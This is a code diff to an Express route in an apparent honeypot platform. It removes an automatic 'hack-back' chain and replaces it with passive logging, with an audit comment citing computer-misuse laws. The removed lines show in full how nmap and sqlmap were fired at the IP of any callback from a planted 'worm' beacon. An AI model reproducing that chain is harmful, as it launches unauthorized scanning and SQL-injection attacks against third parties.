@@ -105,87 +105,19 @@ router.post("/worm-callhome", async (req, res) => {
     });
     collected.wormCallbacks = callbacks;
 
-    // ── AUTO-EXPLOIT on first worm callback ──────────────────────────────────
-    // The worm callhome confirms: (1) the attacker has an HTTP browser open,
-    // (2) we now have their real IP. Auto-launch nmap + SQLmap against it.
-    const alreadyExploiting = collected.autoExploitStatus &&
-      collected.autoExploitStatus !== "idle";
+    // ── PASSIVE EVIDENCE COLLECTION ONLY ─────────────────────────────────────
+    // Audit finding: auto-exploit against callback IPs is a Critical legal risk.
+    // Active scanning/exploitation against any IP without verified written ownership
+    // authorization violates the US CFAA, UK Computer Misuse Act, EU Directive 2013/40/EU,
+    // and most other jurisdictions. Removed unconditionally.
+    // Evidence is recorded passively; manual scoped testing requires explicit admin action.
+    collected.autoExploitStatus = "passive_only";
+    collected.autoExploitReason = "Active scanning requires verified target ownership and explicit written authorization per platform policy.";
+    collected.callbackReceivedAt = new Date().toISOString();
 
-    if (!alreadyExploiting && callbackIp !== "unknown") {
-      const safeIp = callbackIp.replace(/[^0-9a-fA-F.:]/g, "");
-      const jobId  = randomUUID().substring(0, 8).toUpperCase();
+    logger.info({ callbackIp, trappedId: existing.id },
+      "Worm callhome received — passive evidence recorded (active scanning disabled)");
 
-      collected.autoExploitStatus = "running";
-      collected.autoExploitIp     = safeIp;
-      collected.autoExploitJobId  = jobId;
-      collected.autoExploitStartedAt = new Date().toISOString();
-      collected.autoExploitNmap   = null;
-      collected.autoExploitSqlmap = null;
-
-      // Save the "running" state immediately so frontend sees it
-      await db.update(trappedAttackersTable)
-        .set({ dataCollected: JSON.stringify(collected), loopCount: sql`loop_count + 1` })
-        .where(eq(trappedAttackersTable.id, existing.id))
-        .catch(() => { /* ignore */ });
-
-      logger.info({ callbackIp: safeIp, jobId, trappedId: existing.id },
-        "Worm callhome received — auto-exploit chain firing");
-
-      // Fire nmap fast scan against the real callback IP
-      const nmapCmd = `nmap -F -T4 --open ${safeIp}`;
-      exec(nmapCmd, { timeout: 60000 }, async (nmapErr, nmapOut, nmapErr2) => {
-        const nmapResult = [nmapOut, nmapErr2].filter(Boolean).join("\n").substring(0, 4000)
-          || (nmapErr ? nmapErr.message : "No nmap output");
-
-        // After nmap, fire SQLmap against port 80 (worm confirmed browser → HTTP is open)
-        // Also try the honeypot port if it was HTTP-based
-        const honeypotPort = existing.honeypotPort ?? 80;
-        const targetUrl = `http://${safeIp}:${honeypotPort}/`;
-        const sqlmapCmd = [
-          "sqlmap",
-          `-u "${targetUrl}"`,
-          "--batch",
-          "--level=2",
-          "--risk=2",
-          "--timeout=20",
-          "--retries=1",
-          `--output-dir=/tmp/sqlmap-worm-${jobId}`,
-          "--forms",
-          "--dbs",
-          "--crawl=1",
-        ].join(" ");
-
-        exec(sqlmapCmd, { timeout: 120000 }, async (sqlErr, sqlOut, sqlErr2) => {
-          const sqlResult = [sqlOut, sqlErr2].filter(Boolean).join("\n").substring(0, 8000)
-            || (sqlErr ? sqlErr.message : "No sqlmap output");
-
-          // Read current dataCollected fresh before writing results
-          const [fresh] = await db.select().from(trappedAttackersTable)
-            .where(eq(trappedAttackersTable.id, existing.id)).catch(() => []);
-          let freshCollected: Record<string, unknown> = {};
-          try { freshCollected = JSON.parse(fresh?.dataCollected ?? "{}"); } catch { /* */ }
-
-          freshCollected.autoExploitStatus    = "complete";
-          freshCollected.autoExploitNmap      = nmapResult;
-          freshCollected.autoExploitSqlmap    = sqlResult;
-          freshCollected.autoExploitFinishedAt = new Date().toISOString();
-
-          await db.update(trappedAttackersTable)
-            .set({ dataCollected: JSON.stringify(freshCollected) })
-            .where(eq(trappedAttackersTable.id, existing.id))
-            .catch(() => { /* ignore */ });
-
-          logger.info({ callbackIp: safeIp, jobId }, "Worm auto-exploit chain complete");
-        });
-      });
-
-      // Return the GIF immediately — don't await the exploit chain
-      const gif1x1 = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");
-      res.writeHead(200, { "Content-Type": "image/gif", "Content-Length": gif1x1.length });
-      return res.end(gif1x1);
-    }
-
-    // Subsequent callbacks — just update dataCollected (exploit already running)
     await db.update(trappedAttackersTable)
       .set({ dataCollected: JSON.stringify(collected), loopCount: sql`loop_count + 1` })
       .where(eq(trappedAttackersTable.id, existing.id))
